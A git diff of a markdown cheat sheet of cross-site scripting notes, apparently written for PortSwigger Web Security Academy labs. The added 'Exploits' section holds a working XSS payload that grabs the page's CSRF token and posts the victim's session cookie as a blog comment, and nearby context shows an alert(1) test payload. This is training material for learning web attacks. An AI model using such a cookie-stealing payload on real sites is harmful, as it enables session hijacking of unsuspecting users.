@@ -56,7 +56,32 @@ Use animate to set href attribute:
 `${alert(1)}`
 ```
 
-```
+# Exploits
+Steal cookie and post as comment
+```html
+<!-- type module to allow await -->
+<script type="module">
+// Grab CSRF
+const csrf = document.querySelector('[name="csrf"]').value;
+const url = "https://0ab0009604f562a28107b12700a90002.web-security-academy.net/post/comment"
+const response = await fetch(url, {
+    method: "POST",
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: new URLSearchParams(
+        {
+            csrf:csrf,
+            postId:9,
+            comment:"my session cookie is:" + document.cookie,
+            name:"c",
+            email:"a@a",
+            website:"http://"
+        }
 
-# Troubleshooting Exploits
+    ).toString()
+}).then(()=>console.log("Success!"));
+</script>
+```
+## Troubleshooting Exploits
 * Check on different browser
